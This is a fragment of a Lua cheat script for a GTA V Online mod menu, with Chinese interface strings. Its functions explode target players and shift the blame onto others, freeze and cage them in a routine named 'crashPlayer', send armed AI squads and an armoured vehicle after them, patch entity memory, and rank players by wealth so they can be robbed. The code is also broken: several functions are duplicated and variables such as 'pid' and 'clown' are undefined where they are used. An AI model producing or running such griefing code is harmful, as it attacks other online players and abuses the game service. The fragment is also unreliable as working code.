        local alpha_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Opacity")
        local red = menu.get_value(red_colour_ref)
        local green = menu.get_value(green_colour_ref)
        local blue = menu.get_value(blue_colour_ref)
        local alpha = menu.get_value(alpha_colour_ref)
        return red, green, blue, alpha
    end
    function firewingscale(value)
        fireWingsSettings.scale = value / 10
    end
    function firewingcolour(colour)
        fireWingsSettings.colour = colour
    end
    local mildOrangeFire = new.colour( 255, 127, 80 )
    fireBreathSettings = {
        scale = 0.3,
        colour = mildOrangeFire,
        on = false,
        y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
        z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
    }
    local function transitionValue(value, target, step)
        if value == target then return value end
        return value + step * ( value > target and -1 or 1 )
    end
    function fireBreathSettings:changePos(movementType)
        self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
        self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
    end
    levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)
    function firebreathxxx(toggle)
        fireBreathSettings.on = toggle
        if toggle then
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                util.yield()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', players.user_ped(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false)
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
        else
            GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
            fireBreathSettings.ptfx = nil
            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        end
        util.create_tick_handler(function()
            local user_ped = players.user_ped()
            if PED.GET_PED_PARACHUTE_STATE(user_ped) == 0 and ENTITY.IS_ENTITY_IN_AIR(user_ped) then
                GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, 0.81, 0, -10, 0, 0)
            elseif menu.get_value(levitationCommand) then
                GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, -0.12, 0.58, 150, 0, 0)
            else
                local movementType = 'still'
                if TASK.IS_PED_SPRINTING(user_ped) then
                    movementType = 'sprint'
                elseif TASK.IS_PED_WALKING(user_ped) then
                    movementType = 'walk'
                elseif PED.GET_PED_STEALTH_MOVEMENT(user_ped) then
                    movementType = 'sneak'
                end
                fireBreathSettings:changePos(movementType)
                GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, fireBreathSettings.y.value, fireBreathSettings.z.value, 30, 0, 0)
            end
            return fireBreathSettings.on
        end)
    end
    local flameThrower = {
        colour = mildOrangeFire
    }
    function penhuoqi()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) != 1119849093 or not JSkey.is_control_pressed(2, 'INPUT_AIM') then
            if not flameThrower.ptfx then return end
    
            GRAPHICS.REMOVE_PARTICLE_FX(flameThrower.ptfx, true)
            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            flameThrower.ptfx = nil
            return
        end
        PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        util.yield()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
    if flameThrower.ptfx == nil then
        flameThrower.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 0.8, 0, 0, 0, 0, 270, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 'Gun_Nuzzle'), 0.5, false, false, false)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(flameThrower.ptfx, flameThrower.colour.r, flameThrower.colour.g, flameThrower.colour.b)
    end
end
    function firebreathscale(value)
        fireBreathSettings.scale = value / 10
        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireBreathSettings.ptfx, fireBreathSettings.scale)
    end
    function firebreathcolour(colour)
        fireBreathSettings.colour = colour
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
    end
local new = {}
function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end
function new.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = new.colour( 255, 255, 255 )}
end
cashFakeMoney = 0
bankFakeMoney = 0
fakeMoneyLoopDelay = new.delay(250, 0, 0)
fakeMoneyTransactionPending = true
function generateDelaySettings(root, name, delayTable)
    menu.slider(root, '毫秒', {'JS'..name..'DelayMs'}, '延迟是毫秒、秒和最小值的总和.', 1, 999, delayTable.ms, 1, function(value)
        delayTable.ms = value
    end)
    menu.slider(root, '秒', {'JS'..name..'DelaySec'}, '延迟是毫秒、秒和最小值的总和.', 0, 59, delayTable.s, 1, function(value)
        delayTable.s = value
    end)
    menu.slider(root, '分钟', {'JS'..name..'DelayMin'}, '延迟是毫秒、秒和最小值的总和.', 0, 60, delayTable.min, 1, function(value)
        delayTable.min = value
    end)
end
function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end
JS_tbls = {}
do
    JS_tbls.alphaPoints = {0, 87, 159, 207, 255}
end
chatSpamSettings = {
    enabled = false,
    ignoreTeam = true,
    identicalMessages = 5,
}
expLoopDelay = new.delay(250, 0, 0)
    JS_tbls.effects = {
        ['Clown Explosion'] = {
            asset  	= 'scr_rcbarry2',
            name	= 'scr_exp_clown',
            colour 	= false,
            exp     = 31,
        },
        ['Clown Appears'] = {
            asset	= 'scr_rcbarry2',
            name 	= 'scr_clown_appears',
            colour  = false,
            exp     = 71,
        },
        ['FW Trailburst'] = {
            asset 	= 'scr_rcpaparazzo1',
            name 	= 'scr_mich4_firework_trailburst_spawn',
            colour 	= true,
            exp     = 66,
        },
        ['FW Starburst'] = {
            asset	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_starburst',
            colour 	= true,
        },
        ['FW Fountain'] = {
            asset 	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_fountain',
            colour 	= true,
        },
        ['Alien Disintegration'] = {
            asset	= 'scr_rcbarry1',
            name 	= 'scr_alien_disintegrate',
            colour 	= false,
            exp     = 3,
        },
        ['Clown Flowers'] = {
            asset	= 'scr_rcbarry2',
            name	= 'scr_clown_bul',
            colour 	= false,
        },
        ['FW Ground Burst'] = {
            asset 	= 'proj_indep_firework',
            name	= 'scr_indep_firework_grd_burst',
            colour 	= false,
            exp     = 25,
        }
    }
function getTotalDelayabcd(delayTable)
    return (delayTable.ms + (delayTable.s * 1000) + (delayTable.min * 1000 * 60))
end
local new = {}
    function new.delay(MS, S, MIN)
        return {ms = MS, s = S, min = MIN}
    end
    function getTotalDelay(delayTable)
        return (delayTable.ms + (delayTable.s * 1000) + (delayTable.min * 1000 * 60))
    end
    local yeetMultiplier = 1000
    local yeetRange = 1000
    local stormDelay = new.delay(1, 0, 0)  
    function explosion(pos, expSettings)
        if expSettings.currentFx then
            if expSettings.currentFx.exp then
                FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.currentFx.exp, 10, expSettings.audible, true, 0, expSettings.noDamage)
                FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
            else
                FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
            end
            if not expSettings.invisible then
                addFx(pos, expSettings.currentFx, expSettings.colour)
            end
        else
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.expType, 10, expSettings.audible, expSettings.invisible, expSettings.camShake, expSettings.noDamage)
        end
    end
    function set_explosion_proof(entity, value)
        local pEntity = entities.handle_to_pointer(entity)
        if pEntity == 0 then return end
        local damageBits = memory.read_uint(pEntity + 0x0188)
        damageBits = value and setBit(damageBits, 11) or clearBit(damageBits, 11)
        memory.write_uint(pEntity + 0x0188, damageBits)
    end
    function explodePlayer(ped, loop, expSettings)
        pos = ENTITY.GET_ENTITY_COORDS(ped)
        blamedPlayer = PLAYER.PLAYER_PED_ID()
       if expSettings.blamedPlayer and expSettings.blamed then
           blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(expSettings.blamedPlayer)
       elseif expSettings.blamed then
            playerList = players.list(true, true, true)
           blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[math.random(1, #playerList)])
       end
       if not loop and PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
           for i = 0, 50, 1 do --50 explosions to account for most armored vehicles
               if expSettings.owned or expSettings.blamed then
                   ownedExplosion(blamedPlayer, pos, expSettings)
               else
                   explosion(pos, expSettings)
               end
               util.yield(10)
           end
       elseif expSettings.owned or expSettings.blamed then
           ownedExplosion(blamedPlayer, pos, expSettings)
       else
           explosion(pos, expSettings)
       end
       util.yield(10)
   end
   function bomb_shower_tick_handler(ent)
    local start_time = os.clock()
    active_bowling_balls += 1
    util.create_tick_handler(function()
        if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(ent) or os.clock() - start_time > 10 or not ENTITY.DOES_ENTITY_EXIST(ent) then
            if ENTITY.DOES_ENTITY_EXIST(ent) then 
                local c = ENTITY.GET_ENTITY_COORDS(ent)
                FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 17, 100.0, true, false, 0.0)
                entities.delete_by_handle(ent)
            end
            if active_bowling_balls > 0 then 
                active_bowling_balls -= 1
            end
            util.stop_thread()
        end
    end)
end

function roasting_npc_thread(ped, player_ped)
    util.create_tick_handler(function()
        if ENTITY.DOES_ENTITY_EXIST(ped) then 
            TASK.TASK_LOOK_AT_ENTITY(npc, player_ped, 2, 2, 100)
            util.yield(1000)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(npc, player_ped, 0, -0.2, 0, 7.0, -1, 10, true)
            local roasts = {
                "GENERIC_INSULT_MED",
                "GENERIC_INSULT_HIGH"
            }
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(ped, roasts[math.random(#roasts)], "SPEECH_PARAMS_FORCE_SHOUTED")
            util.yield(2000)
        else
            util.stop_thread()
        end
    end)
end
    function getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
        playerList = players.list(whitelistGroups.user, whitelistGroups.friends, whitelistGroups.strangers)
        notWhitelisted = {}
        for i = 1, #playerList do
            if not whitelistListTable[playerList[i]] and not (players.get_name(playerList[i]) == whitelistedName) then
                notWhitelisted[#notWhitelisted + 1] = playerList[i]
            end
        end
        return notWhitelisted
    end
    whitelistGroups = {user = true, friends = true, strangers  = true}
    whitelistListTable = {}
    whitelistedName = false
    karma = {}
    function isAnyPlayerTargetingEntity(playerPed)
        local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
        for k, playerPid in pairs(playerList) do
            if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
                karma[playerPed] = {
                    pid = playerPid,
                    ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                }
                return true
            end
        end
        karma[playerPed] = nil
        return false
    end
    function new.colour(R, G, B, A)
        return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
    end
    function crashPlayer(ped, loop, expSettings)
	   
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)

        local blamedPlayer = PLAYER.PLAYER_PED_ID()
        if expSettings.blamedPlayer and expSettings.blamed then
            blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(expSettings.blamedPlayer)
        elseif expSettings.blamed then
            local playerList = players.list(true, true, true)
            blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[math.random(1, #playerList)])
        end
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("Failed to kick player out of the vehicle", colors.red)
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 
		end
		cage_player(pos)
    end
            local whitelistGroups = {user = true, friends = true, strangers  = true}
            local whitelistListTable = {}
            local whitelistedName = false
                function getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
                    local playerList = players.list(whitelistGroups.user, whitelistGroups.friends, whitelistGroups.strangers)
                    local notWhitelisted = {}
                    for i = 1, #playerList do
                        if not whitelistListTable[playerList[i]] and not (players.get_name(playerList[i]) == whitelistedName) then
                            notWhitelisted[#notWhitelisted + 1] = playerList[i]
                        end
                    end
                    return notWhitelisted
                end
expSettings = {
                camShake = 0, invisible = false, audible = true, noDamage = false, owned = false, blamed = false, blamedPlayer = false, expType = 0,
                colour = new.colour( 255, 0, 255 )
            }

            karma = {}
            function wzys(on_click)
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local vehicleHash = util.joaat("nightshark")
                local pedHash = 1558115333
                requestModels(vehicleHash, pedHash)
                local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
                local vehicle = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
                if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
                    return
                end
        
                local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
                local outCoords = v3.new()
                local outHeading = memory.alloc()
        
                if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
                    ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
                    ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
                    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
                end
                for i=-1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
                    local clown = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
                    PED.SET_PED_INTO_VEHICLE(clown, vehicle, i)
                    if i % 2 == 0 then
                        WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 9999, false, true)
                        PED.SET_PED_FIRING_PATTERN(clown, -957453492)
                    else
                        WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 9999, false, true)
                        PED.SET_PED_FIRING_PATTERN(clown, -957453492)
                    end
                    PED.SET_PED_AS_COP(clown, true)
                    addBlipForEntity(vehicle, 724, 85)
                    PED.SET_PED_CONFIG_FLAG(clown, 281, true)
                    PED.SET_PED_CONFIG_FLAG(clown, 2, true)
                    PED.SET_PED_CONFIG_FLAG(clown, 33, false)
                    PED.SET_PED_COMBAT_ATTRIBUTES(clown, 5, true)
                    PED.SET_PED_COMBAT_ATTRIBUTES(clown, 46, true)
                    PED.SET_PED_ACCURACY(clown, 100.0)
                    PED.SET_PED_HEARING_RANGE(clown, 99999)
                    PED.SET_PED_RANDOM_COMPONENT_VARIATION(clown, 0)
                    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 3)
                    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "FIB")
                    VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(vehicle, false)
                    VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
                    PED.SET_PED_MAX_HEALTH(clown, 150)
                    ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, true, false, false, false)
                    ENTITY.SET_ENTITY_HEALTH(clown, 150)
                    PED.SET_PED_ARMOUR(clown, 100)
                    PED.SET_PED_SHOOT_RATE(clown, 5)
                    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
                    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0) --black
                    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, 0, 0, 0)
                    VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, 3, 0, 0) --matte finish
                    VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, 3, 0, 0)-- matte secondary
                    VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, 11) --street wheel type
                    PED.SET_PED_SUFFERS_CRITICAL_HITS(clown, false)
                    VEHICLE.SET_VEHICLE_MOD(vehicle, 0, 3) --spoiler
                    VEHICLE.SET_VEHICLE_MOD(vehicle, 23, 0)--wheel type?
                    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, 0, 0) --wheel color
                    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 4) --plate type, 4 is SA EXEMPT which law enforcement and government vehicles use
                    if godmodeatk then
                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
                    end
                    if pcar then 
                        PED.SET_PED_COMBAT_ATTRIBUTES(clown, 3, false)
                    end
                    if d then
                        PED.SET_AI_WEAPON_DAMAGE_MODIFIER(clown, 3000000)
                    end
                    if i == -1 then
                        TASK.TASK_VEHICLE_CHASE(clown, player_ped)
                        WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 1000, false, true)
                    else
                        TASK.TASK_COMBAT_PED(clown, player_ped, 0, 16)
                        WEAPON.GIVE_WEAPON_TO_PED(clown, 4208062921, 9999, false, true)
                        WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x8B3C480B)
                        WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x4DB62ABE)
                        WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x5DD5DBD5)
                        WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x9D65907A)
                        WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(clown, 4208062921, 0x420FD713)
                        PED.SET_PED_FIRING_PATTERN(clown, -957453492)
                    end
                end
            end
    function playerIsTargetingEntity(playerPed)
        local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
        for k, playerPid in pairs(playerList) do
            if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
                karma[playerPed] = {
                    pid = playerPid,
                    ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                }
                return true
            end
        end
        karma[playerPed] = nil
        return false
    end
function get_best_mug_target()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_wallet = players.get_wallet(p)
        if cur_wallet > most then
            most = cur_wallet
            mostp = p
        end
    end
    if cur_wallet == nil then
        util.toast("你孤单一人。找不到最佳抢劫目标。")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 钱包里的钱最多($" .. most .. ")。 也许去抢劫他们。"
    else
        util.toast("找不到最佳抢劫目标。")
        return nil
    end
end
function get_poorest_player()
    local least = 10000000000000000
    local leastp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets < least then
            least = cur_assets
            leastp = p
        end
    end
    if cur_assets == nil then
        util.toast("找不到最穷的玩家。")
        return
    end
    if least ~= 10000000000000000 then
        return PLAYER.GET_PLAYER_NAME(leastp) .. " 是本战局中最穷的玩家!(有$" .. players.get_wallet(leastp) .. " 在他们的钱包里$" .. players.get_bank(leastp) .. " 在银行里!)"
    else
        util.toast("找不到最穷的玩家。")
        return nil
    end
end
function random(t) --returns a random value from table
	local list = {}
	for k, value in pairs(t) do table.insert(list, value) end
	return list[math.random(1, #list)]
end
function ped_explosion(pid, model_name, amount)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, false)

    for i = 1, (amount or 5) do
        local hash = util.joaat(model_name or "a_c_shepherd")
        load_model(hash)

        local dog = entities.create_ped(28, hash, coords, math.random(0, 270))

        local size = 20
        local x = math.random(-size, size)
        local y = math.random(-size, size)
        local z = 5

        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(dog, 1, x, y, z, true, false, true, true)
        AUDIO.PLAY_PAIN(dog, 7, 0)
    end
end
function fake_explosion(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 0, true, true, 0)
end
function wzAPC(on_click)
    local vehicleHash = util.joaat("apc")
		local pedHash = 1558115333 
		requestModels(vehicleHash, pedHash)
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
		local vehicle = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
			return
		end

		local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
		local outCoords = v3.new()
		local outHeading = memory.alloc()

		if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
			ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
			ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
			VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
			for seat = -1, -1 do
				local cop = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
				PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
				PED.SET_PED_CONFIG_FLAG(clown, 281, true)
				PED.SET_PED_CONFIG_FLAG(clown, 2, true)
				PED.SET_PED_CONFIG_FLAG(clown, 33, false)
				TASK.TASK_COMBAT_PED(cop, targetPed, 0, 16)
				VEHICLE.SET_VEHICLE_COLOURS(vehicle, 0, 0)
				VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vehicle, true)
				VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle,-1, 3)
				PED.SET_PED_COMBAT_ATTRIBUTES(cop, 46, true)
				PED.SET_PED_COMBAT_ATTRIBUTES(cop, 5, true)
				PED.SET_PED_COMBAT_ATTRIBUTES(cop, 2, true)
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "FIB")
				VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
				PED.SET_PED_COMBAT_ATTRIBUTES(cop, 3, false)
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 3)
				PED.SET_PED_MAX_HEALTH(cop, 150)
				ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, true, false, false, false)
				ENTITY.SET_ENTITY_HEALTH(cop, 150)
				PED.SET_PED_SHOOT_RATE(cop, 5)
				PED.SET_PED_SUFFERS_CRITICAL_HITS(cop, false)
				WEAPON.GIVE_WEAPON_TO_PED(cop, 584646201, 9999, false, true)
				PED.SET_PED_ACCURACY(cop, 100.0)
				PED.SET_PED_HEARING_RANGE(cop, 99999)
				PED.SET_PED_AS_COP(cop, true)
				addBlipForEntity(vehicle, 558, 59)
				VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0) --black
				VEHICLE.SET_VEHICLE_MOD(vehicle, 10, 0)
				VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, 0, 0, 0)
				VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, 3, 0, 0) --matte finish
				VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, 3, 0, 0)-- matte secondary
				VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, 11) --street wheel type
				PED.SET_PED_SUFFERS_CRITICAL_HITS(clown, false)
				VEHICLE.SET_VEHICLE_MOD(vehicle, 23, 0)--wheel type?
				VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, 0, 0) --wheel color
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 4) --plate type, 4 is SA EXEMPT which law enforcement and government vehicles use
				if ktask then
					PED.SET_PED_KEEP_TASK(clown, true)
				end
			end
			for seats = 0, 2 do
				local cops = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
				PED.SET_PED_INTO_VEHICLE(cops, vehicle, seats)
				PED.SET_PED_CONFIG_FLAG(cops, 281, true)
				PED.SET_PED_CONFIG_FLAG(cops, 2, true)
				PED.SET_PED_CONFIG_FLAG(cops, 33, false)
				TASK.TASK_VEHICLE_CHASE(cops, targetPed)
				VEHICLE.SET_VEHICLE_COLOURS(vehicle, 0, 0)
				VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vehicle, true)
				VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, -1, 3)
				PED.SET_PED_COMBAT_ATTRIBUTES(cops, 46, true)
				PED.SET_PED_COMBAT_ATTRIBUTES(cops, 5, true)
				PED.SET_PED_COMBAT_ATTRIBUTES(cops, 2, true)
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "FIB")
				VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
				PED.SET_PED_COMBAT_ATTRIBUTES(cops, 3, false)
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 3)
				PED.SET_PED_MAX_HEALTH(cops, 150)
				ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, true, false, false, false)
				ENTITY.SET_ENTITY_HEALTH(cops, 150)
				PED.SET_PED_SHOOT_RATE(cops, 5)
				PED.SET_PED_SUFFERS_CRITICAL_HITS(cops, false)
				WEAPON.GIVE_WEAPON_TO_PED(cops, 584646201, 9999, false, true)
				PED.SET_PED_ACCURACY(cops, 100.0)
				PED.SET_PED_HEARING_RANGE(cops, 99999)
				PED.SET_PED_AS_COP(cops, true)
				addBlipForEntity(vehicle, 558, 59)
				VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0) --black
				VEHICLE.SET_VEHICLE_MOD(vehicle, 10, 0)
				VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, 0, 0, 0)
				VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, 3, 0, 0) --matte finish
				VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, 3, 0, 0)-- matte secondary
				VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, 11) --street wheel type
				PED.SET_PED_SUFFERS_CRITICAL_HITS(cops, false)
				VEHICLE.SET_VEHICLE_MOD(vehicle, 23, 0)--wheel type?
				VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, 0, 0) --wheel color
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 4)
				if ktask then
					PED.SET_PED_KEEP_TASK(cop, true)
				end
			end
		end
		v3.free(outCoords)
		memory.free(outHeading)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
	end
function get_richest_player()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(false, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets > most then
            most = cur_assets
            mostp = p
        end
    end
    if cur_assets == nil then
        util.toast("你孤单一人。找不到最富的玩家。")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 是本战局中最富的玩家!(有$" .. players.get_wallet(mostp) .. " 在他们的钱包里$" .. players.get_bank(mostp) .. " 在银行里!)"
    else
        util.toast("找不到最富的玩家。")
        return nil
    end
end
function roundDecimals(float, decimals)
    decimals = 10 ^ decimals
    return math.floor(float * decimals) / decimals
